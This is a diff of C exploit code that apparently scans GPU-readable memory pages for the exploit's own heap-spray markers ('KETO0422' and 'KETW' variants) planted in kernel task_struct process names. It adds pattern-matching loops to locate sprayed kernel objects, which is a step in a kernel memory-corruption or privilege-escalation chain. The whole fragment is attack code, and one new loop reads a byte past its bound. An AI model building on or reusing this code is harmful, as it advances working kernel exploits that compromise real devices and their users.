@@ -394,13 +394,73 @@ int main(int argc, char **argv) {
                 if (read_gpu_page(va, buf) == 0) {
                     int found_sig = 0;
                     int found_off = -1;
-                    // 1a. task_struct comm = "KETO0422" (our spray) — full 8-byte marker
+                    // 1a. task_struct comm = "KETO0422" (our master spray) — 8 bytes
                     void *p = memmem(buf, PAGE_SIZE, "KETO0422", 8);
                     if (p) { found_sig = 1; found_off = (int)((uint8_t*)p - buf); }
-                    // 1b. task_struct comm = "KET00422" (v6.c spray) — note the missing 0
+                    // 1b. task_struct comm = "KET00422" (v6.c legacy) — note the missing 0
                     if (!found_sig) {
                         p = memmem(buf, PAGE_SIZE, "KET00422", 8);
                         if (p) { found_sig = 1; found_off = (int)((uint8_t*)p - buf); }
+                    }
+                    // 1c. KETO04NN — our 4-digit spray from verticalized
+                    //     learning (KETO + 4 digits, total 8 bytes).
+                    if (!found_sig) {
+                        const char *q = (const char *)buf;
+                        for (int i = 0; i <= PAGE_SIZE - 8; i++) {
+                            if (q[i]   == 'K' && q[i+1] == 'E' &&
+                                q[i+2] == 'T' && q[i+3] == 'O' &&
+                                q[i+4] >= '0' && q[i+4] <= '9' &&
+                                q[i+5] >= '0' && q[i+5] <= '9' &&
+                                q[i+6] >= '0' && q[i+6] <= '9' &&
+                                q[i+7] >= '0' && q[i+7] <= '9') {
+                                // Verify: full 16-byte comm must be
+                                // letters/digits/NUL only.
+                                int ok = 1;
+                                for (int j = 8; j < 16; j++) {
+                                    if (i + j >= PAGE_SIZE) { ok = 0; break; }
+                                    uint8_t cj = (uint8_t)q[i + j];
+                                    if (cj != 0 &&
+                                        !(cj >= '0' && cj <= '9')) {
+                                        ok = 0;
+                                        break;
+                                    }
+                                }
+                                if (ok) {
+                                    found_sig = 1;
+                                    found_off = i;
+                                    break;
+                                }
+                            }
+                        }
+                    }
+                    // 1d. KETW{0,1,2}{NNN} — per-subworker marker for
+                    //     debugging which subworker sprayed which proc.
+                    if (!found_sig) {
+                        const char *qw = (const char *)buf;
+                        for (int i = 0; i <= PAGE_SIZE - 7; i++) {
+                            if (qw[i]   == 'K' && qw[i+1] == 'E' &&
+                                qw[i+2] == 'T' && qw[i+3] == 'W' &&
+                                qw[i+4] >= '0' && qw[i+4] <= '2' &&
+                                qw[i+5] >= '0' && qw[i+5] <= '9' &&
+                                qw[i+6] >= '0' && qw[i+6] <= '9' &&
+                                qw[i+7] >= '0' && qw[i+7] <= '9') {
+                                int ok = 1;
+                                for (int j = 7; j < 16; j++) {
+                                    if (i + j >= PAGE_SIZE) { ok = 0; break; }
+                                    uint8_t cj = (uint8_t)qw[i + j];
+                                    if (cj != 0 &&
+                                        !(cj >= '0' && cj <= '9')) {
+                                        ok = 0;
+                                        break;
+                                    }
+                                }
+                                if (ok) {
+                                    found_sig = 1;
+                                    found_off = i;
+                                    break;
+                                }
+                            }
+                        }
                     }
                     // 2. System app
                     if (!found_sig) {
